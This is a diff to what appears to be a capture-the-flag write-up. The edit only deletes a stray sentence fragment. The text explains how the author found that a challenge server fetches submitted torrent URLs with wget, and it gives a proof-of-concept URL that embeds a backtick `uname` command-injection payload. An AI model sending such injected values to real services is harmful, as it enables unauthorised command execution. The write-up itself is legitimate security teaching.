@@ -5,7 +5,7 @@ In this problem, we were given a website with a form and the instructions: "inpu
 
 ### Unsafe wget
 
-First, I submitted a url that pointed to a torrentfile on a server I controlled. Looking at the user-agent in the request made, it was clear that the server was using the `wget` command to fetch my torrent file. With this knowledge. If the server was in fact using wget to fetch the urls we provided, we could likely get it to execute arbitary commands. As a simple POC, I gave it this url:
+First, I submitted a url that pointed to a torrentfile on a server I controlled. Looking at the user-agent in the request made, it was clear that the server was using the `wget` command to fetch my torrent file. If the server was in fact using wget to fetch the urls we provided, we could likely get it to execute arbitary commands. As a simple POC, I gave it this url:
 ```
 http://<myserver>/`uname`.torrent
 ```
